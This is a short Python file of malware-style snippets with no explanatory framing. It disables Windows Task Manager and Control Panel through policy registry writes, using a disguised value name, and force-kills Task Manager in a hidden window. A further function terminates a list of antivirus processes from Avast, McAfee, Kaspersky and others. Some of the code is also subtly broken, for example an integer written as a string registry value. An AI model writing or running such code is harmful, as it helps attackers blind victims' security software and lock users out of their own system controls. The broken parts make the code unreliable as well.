# DISABLE TASKMANGER

import winreg

def disable_task_manager():
    registry_path: str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    registry_name: str = "Windows Root Certificate"
    value: int = 1
    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
    winreg.CloseKey(reg_key)

# OR EASIER VERSION


import subprocess
from time import sleep

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)

# DISABLE CONTROL PANEL SAME CODE BUT

registry_path:str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"


#AV KILL

import subprocess
import win32con
import win32gui


def av_kill():
    avs = ['avast.exe', 'avg.exe', 'McAfee.exe', 'avira.exe', 'BitDefender.exe',
           'sophos.exe', '360.exe', 'kaspersky.exe']

    for av in avs:
        cmd = f'taskkill /IM {av} /F'
        try:
            subprocess.run(cmd, shell=True)
        except Exception:
            pass
        else:
            print("idk")


def main():
    av_kill()

if __name__ == "__main__":
    main()






